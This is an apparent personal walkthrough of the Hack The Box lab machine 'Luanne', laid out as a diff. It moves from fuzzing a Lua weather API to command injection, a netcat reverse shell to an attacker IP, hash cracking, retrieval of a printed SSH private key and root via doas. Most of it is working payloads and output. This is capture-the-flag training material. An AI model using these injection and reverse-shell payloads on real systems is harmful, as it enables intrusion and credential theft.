@@ -1,0 +1,579 @@
+Luanne - Hack The Box - OTHER
+
+Application on port 9001 is supervisord, uses default creds google those creds. Weather API, needs fuzzing, frustration on
+how it works.
+
+We go to port 9001 and we notice that, we can enter creds we find the credentials fro Medusa 1.12 which is user:123
+
+After logging in We look at the processes page and we find the following:
+http://10.10.10.218:9001/tail.html?processname=processes
+
+COMMANDS and OUTPUT:
+==================================================================================================================================
+/python3.8 /usr/pkg/bin/supervisord-3.8 
+root        348  0.0  0.0  71348  2928 ?     Is    5:06PM 0:00.00 /usr/sbin/sshd 
+_httpd      376  0.0  0.0  34952  1996 ?     Is    5:06PM 0:00.01 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www 
+root        402  0.0  0.0  20216  1648 ?     Ss    5:06PM 0:00.03 /usr/sbin/cron 
+_httpd     9230  0.0  0.0  17684  1416 ?     O     8:19PM 0:00.00 /usr/bin/egrep ^USER| \\[system\\] *$| init *$| /usr/sbin/sshd *$| /usr/sbin/syslogd -s *$| /usr/pkg/bin/python3.8 /usr/pkg/bin/supervisord-3.8 *$| /usr/sbin/cron *$| /usr/sbin/powerd *$| /usr/libexec/httpd -u -X -s.*$|^root.* login *$| /usr/libexec/getty Pc ttyE.*$| nginx.*process.*$ 
+root        421  0.0  0.0  23072  1576 ttyE1 Is+   5:06PM 0:00.00 /usr/libexec/getty Pc ttyE1 
+root        388  0.0  0.0  19924  1584 ttyE2 Is+   5:06PM 0:00.00 /usr/libexec/getty Pc ttyE2 
+root        433  0.0  0.0  19780  1576 ttyE3 Is+   5:06PM 0:00.00 /usr/libexec/getty Pc ttyE3 
+
+==================================================================================================================================
+
+Lua is acripting language used by nmap. We will try to fuzz the endpoint.
+
+COMMANDS and OUTPUT:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/luanne]
+└──╼ $ffuf -u http://10.10.10.218/weather/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt 
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.0 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.10.218/weather/FUZZ
+ :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+forecast                [Status: 200, Size: 90, Words: 12, Lines: 2]
+:: Progress: [43003/43003] :: Job [1/1] :: 417 req/sec :: Duration: [0:01:44] :: Errors: 0 ::
+==================================================================================================================================
+
+We find forecast from the results based on the fuzzing results, so we head over to the forecast webpage and see what we can find.
+And we get the following data.
+
+COMMANDS and OUTPUT:
+==================================================================================================================================
+code	200
+message	"No city specified. Use 'city=list' to list available cities."
+==================================================================================================================================
+
+So we do the following http://10.10.10.218/weather/forecast?city=list and get this output:
+COMMANDS and OUTPUT:
+==================================================================================================================================
+	
+code	200
+cities	
+0	"London"
+1	"Manchester"
+2	"Birmingham"
+3	"Leeds"
+4	"Glasgow"
+5	"Southampton"
+6	"Liverpool"
+7	"Newcastle"
+8	"Nottingham"
+9	"Sheffield"
+10	"Bristol"
+11	"Belfast"
+12	"Leicester"
+==================================================================================================================================
+We try the follwoing http://10.10.10.218/weather/forecast?city=London and get even more output
+COMMANDS and OUTPUT:
+==================================================================================================================================
+	
+code	200
+city	"London"
+list	
+0	
+date	"2021-04-12"
+weather	
+description	"snowy"
+temperature	
+min	"12"
+max	"46"
+pressure	"1799"
+humidity	"92"
+wind	
+speed	"2.1975513692014"
+degree	"102.76822959445"
+1	
+date	"2021-04-13"
+weather	
+description	"partially cloudy"
+temperature	
+min	"15"
+max	"43"
+pressure	"1365"
+humidity	"51"
+wind	
+speed	"4.9522297247313"
+degree	"262.63571172766"
+...
+...
+...
+==================================================================================================================================
+
+Next thing we will do is try fuff again against that parameter to see what we can find or break. We will change the word list
+to something broader.
+http://10.10.10.218/weather/forecast?city=FUZZ
+
+COMMANDS and OUTPUT:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/luanne]
+└──╼ $ffuf -u http://10.10.10.218/weather/forecast?city=FUZZ -w /opt/SecLists/Fuzzing/special-chars.txt 
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.0 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.10.218/weather/forecast?city=FUZZ
+ :: Wordlist         : FUZZ: /opt/SecLists/Fuzzing/special-chars.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+%                       [Status: 200, Size: 90, Words: 12, Lines: 2]
+:: Progress: [32/32] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
+==================================================================================================================================
+
+Don't really find anything so we will use curl to see what error code we get when we put in something not matching.
+
+COMMANDS and OUTPUT:
+==================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/luanne]
+└──╼ $curl http://10.10.10.218/weather/forecast?city=asd
+{"code": 500,"error": "unknown city: asd"}┌─[user@parrot-virtual]─[~/htb/luanne]
+└──╼ $
+==================================================================================================================================
+
+Now that we have the error code we tell ffuf to to look for the error code 500.
+
+COMMANDS and OUTPUT:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/luanne]
+└──╼ $ffuf -u http://10.10.10.218/weather/forecast?city=FUZZ -w /opt/SecLists/Fuzzing/special-chars.txt -mc 200,500
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.0 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.10.218/weather/forecast?city=FUZZ
+ :: Wordlist         : FUZZ: /opt/SecLists/Fuzzing/special-chars.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,500
+________________________________________________
+
+_                       [Status: 500, Size: 40, Words: 5, Lines: 1]
+)                       [Status: 500, Size: 40, Words: 5, Lines: 1]
+~                       [Status: 500, Size: 40, Words: 5, Lines: 1]
+!                       [Status: 500, Size: 40, Words: 5, Lines: 1]
+@                       [Status: 500, Size: 40, Words: 5, Lines: 1]
+$                       [Status: 500, Size: 40, Words: 5, Lines: 1]
+(                       [Status: 500, Size: 40, Words: 5, Lines: 1]
+=                       [Status: 500, Size: 40, Words: 5, Lines: 1]
++                       [Status: 500, Size: 40, Words: 6, Lines: 1]
+%                       [Status: 200, Size: 90, Words: 12, Lines: 2]
+^                       [Status: 500, Size: 40, Words: 5, Lines: 1]
+#                       [Status: 500, Size: 39, Words: 5, Lines: 1]
+&                       [Status: 500, Size: 39, Words: 5, Lines: 1]
+\                       [Status: 500, Size: 39, Words: 5, Lines: 1]
+_                       [Status: 500, Size: 40, Words: 5, Lines: 1]
+}                       [Status: 500, Size: 40, Words: 5, Lines: 1]
+*                       [Status: 500, Size: 40, Words: 5, Lines: 1]
+.                       [Status: 500, Size: 40, Words: 5, Lines: 1]
+"                       [Status: 500, Size: 40, Words: 5, Lines: 1]
+{                       [Status: 500, Size: 40, Words: 5, Lines: 1]
+]                       [Status: 500, Size: 40, Words: 5, Lines: 1]
+?                       [Status: 500, Size: 40, Words: 5, Lines: 1]
+[                       [Status: 500, Size: 40, Words: 5, Lines: 1]
+/                       [Status: 500, Size: 40, Words: 5, Lines: 1]
+:                       [Status: 500, Size: 40, Words: 5, Lines: 1]
+`                       [Status: 500, Size: 40, Words: 5, Lines: 1]
+>                       [Status: 500, Size: 40, Words: 5, Lines: 1]
+,                       [Status: 500, Size: 40, Words: 5, Lines: 1]
+<                       [Status: 500, Size: 40, Words: 5, Lines: 1]
+;                       [Status: 500, Size: 40, Words: 5, Lines: 1]
+|                       [Status: 500, Size: 40, Words: 5, Lines: 1]
+'                       [Status: 500, Size: 77, Words: 9, Lines: 2]
+:: Progress: [32/32] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
+==================================================================================================================================
+
+We will filter everything with 5 words and see what the results display
+
+COMMANDS and OUTPUT:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/luanne]
+└──╼ $ffuf -u http://10.10.10.218/weather/forecast?city=FUZZ -w /opt/SecLists/Fuzzing/special-chars.txt -mc 200,500 -fw 5
++                       [Status: 500, Size: 40, Words: 6, Lines: 1]
+'                       [Status: 500, Size: 77, Words: 9, Lines: 2]
+%                       [Status: 200, Size: 90, Words: 12, Lines: 2]
+:: Progress: [32/32] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
+==================================================================================================================================
+
+By issuing a "'" we are able to trigger an error on the system.
+
+COMMANDS and OUTPUT:
+==================================================================================================================================
+http://10.10.10.218/weather/forecast?city='
+SyntaxError: JSON.parse: unexpected character at line 1 column 1 of the JSON data
+==================================================================================================================================
+
+If we look at the source code (control + u), we get the following error message from lua:
+COMMANDS and OUTPUT:
+==================================================================================================================================
+<br>Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value
+==================================================================================================================================
+
+We will use burp suite to further explore what adding special characters does to the application. After trying several times we are
+unable to get proper code execution using os.execute("echo 'test'")
+
+Next thing to do then is to use ffuf yet again to see if adding the single quote character with other special character in 
+conjunction will make it behave any differently. We also append the "--" characters in order to create a lua comment.
+COMMANDS and OUTPUT:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/luanne]
+└──╼ $ffuf -u http://10.10.10.218/weather/forecast?city=\'FUZZ-- -w /opt/SecLists/Fuzzing/special-chars.txt  -mc 200,500 -fw 9
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.0 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.10.218/weather/forecast?city='FUZZ--
+ :: Wordlist         : FUZZ: /opt/SecLists/Fuzzing/special-chars.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,500
+ :: Filter           : Response words: 9
+________________________________________________
+
+)                       [Status: 500, Size: 37, Words: 5, Lines: 1]
+:: Progress: [32/32] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
+==================================================================================================================================
+
+It behaves differently when we add a ")" to the query.
+
+COMMANDS and OUTPUT:
+==================================================================================================================================
+Burpsuite:
+Request:
+GET /weather/forecast?city=')-- HTTP/1.1
+Response:
+{"code": 500,"error": "unknown city:
+
+Request:
+GET /weather/forecast?city=london')-- HTTP/1.1
+Response:
+{"code": 500,"error": "unknown city: london
+==================================================================================================================================
+
+What this tells us is that we have completed that we are basically completing the code in lua that gets outputed, so we can take
+advantage of this to get code execution on the system. We can now perofrm an os.execute by ending the previous code statement
+prematurely.
+
+COMMANDS and OUTPUT:
+==================================================================================================================================
+Burpsuite:
+Request:
+GET /weather/forecast?city=london');os.execute("id");-- HTTP/1.1
+Response:
+{"code": 500,"error": "unknown city: londonuid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
+
+==================================================================================================================================
+
+
+We will confirm that we can now curl the application:
+COMMANDS and OUTPUT:
+==================================================================================================================================
+Burpsuite:
+Request:
+GET /weather/forecast?city=london');os.execute("curl+10.10.14.23:8000/shell.sh");-- HTTP/1.1
+Response:
+
+
+{"code": 500,"error": "unknown city: london<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
+        "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+        <title>Error response</title>
+    </head>
+    <body>
+        <h1>Error response</h1>
+        <p>Error code: 404</p>
+        <p>Message: File not found.</p>
+        <p>Error code explanation: HTTPStatus.NOT_FOUND - Nothing matches the given URI.</p>
+    </body>
+</html>
+==================================================================================================================================
+
+We can now look for bsd reverse shells on line and attemt the reverse shell connection
+COMMANDS and OUTPUT:
+==================================================================================================================================
+Burpsuite:
+Request:
+GET /weather/forecast?city=london');os.execute("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.23+9001+>/tmp/f");-- HTTP/1.1
+
+Commandline:
+└──╼ $nc -lnvp 9001
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.10.10.218.
+Ncat: Connection from 10.10.10.218:65187.
+sh: can't access tty; job control turned off
+$ 
+
+ALTERNATIVE Command line one liner:
+curl "http://10.10.10.218/weather/forecast?city=london');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 9001 >/tmp/f");--"
+==================================================================================================================================
+
+Interesting finding right off the bat.
+COMMANDS and OUTPUT:
+==================================================================================================================================
+$ ls -a
+.
+..
+.htpasswd
+index.html
+robots.txt
+$ cat .htpasswd
+webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
+==================================================================================================================================
+
+We can attempt to crack it. Looks md5 crypted.
+COMMANDS and OUTPUT:
+==================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/luanne]
+└──╼ $hashcat -m 500 --force 379 └──╼ $hashcat -m 500 --force hash.txt /usr/share/wordlists/rockyou.txt
+┌─[user@parrot-virtual]─[~/htb/luanne]
+└──╼ $hashcat -m 500 --force hash.txt /usr/share/wordlists/rockyou.txt --show
+$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0:iamthebest
+==================================================================================================================================
+
+So we now have the cred for webapi_user:iamthebest now we have to figure out how we can leverage it. We can try and use it on the
+main webpage and see if it leads us anywhere. Indeed it does however just displays the API results for london and city
+
+Once inside we look at hte active conections and see that r.micahels is running the weather app
+COMMANDS and OUTPUT:
+==================================================================================================================================
+ps -auxw | grep 3001
+r.michaels   185  0.0  0.0  34992  1972 ?     Is    5:06PM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /hom
+==================================================================================================================================
+
+COMMANDS and OUTPUT:
+==================================================================================================================================
+/usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www
+==================================================================================================================================
+
+So one of the things to look at are the options displayed by said commmand above, they show that there is an http server running
+on the local mmahine and that anyone in local host can access it with no issues.
+
+We can do this ourselves using curl and specfiying the credentials we got from .htpasswd file
+COMMANDS and OUTPUT:
+==================================================================================================================================
+Before:
+curl localhost:3001/~r.michaels/
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   211  100   211    0     0  70333      0 --:--:-- --:--:-- --:--:-- 70333
+<html><head><title>401 Unauthorized</title></head>
+<body><h1>401 Unauthorized</h1>
+~r.michaels//: <pre>No authorization</pre>
+<hr><address><a href="//localhost:3001/">localhost:3001</a></address>
+</body></html>
+
+After:
+curl --user webapi_user:iamthebest localhost:3001/~r.michaels/
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   601    0   601    0     0   293k      0 --:--:-- --:--:-- --:--:--  293k
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"/>
+<style type="text/css">
+table {
+	border-top: 1px solid black;
+	border-bottom: 1px solid black;
+}
+th { background: aquamarine; }
+tr:nth-child(even) { background: lavender; }
+</style>
+<title>Index of ~r.michaels/</title></head>
+<body><h1>Index of ~r.michaels/</h1>
+<table cols=3>
+<thead>
+<tr><th>Name<th>Last modified<th align=right>Size
+<tbody>
+<tr><td><a href="../">Parent Directory</a><td>16-Sep-2020 18:20<td align=right>1kB
+<tr><td><a href="id_rsa">id_rsa</a><td>16-Sep-2020 16:52<td align=right>3kB
+</table>
+</body></html>
+
+==================================================================================================================================
+
+Now that we can access r.michaels directly with curl we should be able to pull the ssh public and private keys.
+COMMANDS and OUTPUT:
+==================================================================================================================================
+curl --user webapi_user:iamthebest localhost:3001/~r.michaels/id_rsa
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2610  100  2610    0     0   849k      0 --:--:-- --:--:-- --:--:--  849k
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+==================================================================================================================================
+
+We can now login normally with ssh and th private key.
+COMMANDS and OUTPUT:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/luanne/www]
+└──╼ $ssh -i id_rsa r.michaels@10.10.10.218
+Last login: Fri Sep 18 07:06:51 2020
+NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020
+
+Welcome to NetBSD!
+
+luanne$ 
+==================================================================================================================================
+
+Interesting finding is that we locate gnupg directory
+COMMANDS and OUTPUT:
+==================================================================================================================================
+luanne$ ls -la
+total 52
+dr-xr-x---  7 r.michaels  users   512 Sep 16  2020 .
+drwxr-xr-x  3 root        wheel   512 Sep 14  2020 ..
+-rw-r--r--  1 r.michaels  users  1772 Feb 14  2020 .cshrc
+drwx------  2 r.michaels  users   512 Sep 14  2020 .gnupg
+-rw-r--r--  1 r.michaels  users   431 Feb 14  2020 .login
+-rw-r--r--  1 r.michaels  users   265 Feb 14  2020 .logout
+-rw-r--r--  1 r.michaels  users  1498 Feb 14  2020 .profile
+-rw-r--r--  1 r.michaels  users   166 Feb 14  2020 .shrc
+dr-x------  2 r.michaels  users   512 Sep 16  2020 .ssh
+dr-xr-xr-x  2 r.michaels  users   512 Nov 24 09:26 backups
+dr-xr-x---  4 r.michaels  users   512 Sep 16  2020 devel
+dr-x------  2 r.michaels  users   512 Sep 16  2020 public_html
+-r--------  1 r.michaels  users    33 Sep 16  2020 user.txt
+==================================================================================================================================
+
+We look at backups and we find an encrypted tar file most likely do with gnupg directory and keys.
+COMMANDS and OUTPUT:
+==================================================================================================================================
+luanne$ cd backups/                                                                                                                      
+luanne$ ls
+devel_backup-2020-09-16.tar.gz.enc
+luanne$ netpgp --decrypt --output /tmp/backup.tar.gz  devel_backup-2020-09-16.tar.gz.enc 
+signature  2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14 
+Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a 
+uid              RSA 2048-bit key <r.michaels@localhost>
+
+==================================================================================================================================
+
+We extrat the files and notice that we get a new devel directory with a new .htpaswd hash
+
+COMMANDS and OUTPUT:
+==================================================================================================================================
+luanne$ cd /tmp/                                                                                                                         
+luanne$ ls
+backup.tar.gz
+luanne$ tar xvf backup.tar.gz                                                                                                            
+x devel-2020-09-16/
+x devel-2020-09-16/www/
+x devel-2020-09-16/webapi/
+x devel-2020-09-16/webapi/weather.lua
+x devel-2020-09-16/www/index.html
+x devel-2020-09-16/www/.htpasswd
+luanne$ ls
+backup.tar.gz    devel-2020-09-16
+luanne$ cat devel-2020-09-16/www/.htpasswd
+webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.
+==================================================================================================================================
+
+We crack the hash with hashcat and get the follwoing:
+COMMANDS and OUTPUT:
+==================================================================================================================================
+└──╼ $hashcat -m 500 --force hash2.txt /usr/share/wordlists/rockyou.txt 
+$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.:littlebear
+==================================================================================================================================
+
+Now we attempt to use netbsd's equivalent to sudo being doas to get a root shell
+COMMANDS and OUTPUT:
+==================================================================================================================================
+luanne$ doas sh
+Password:
+# whoami
+root
+# 
+==================================================================================================================================
+
+COMMANDS and OUTPUT:
+==================================================================================================================================
+==================================================================================================================================
+
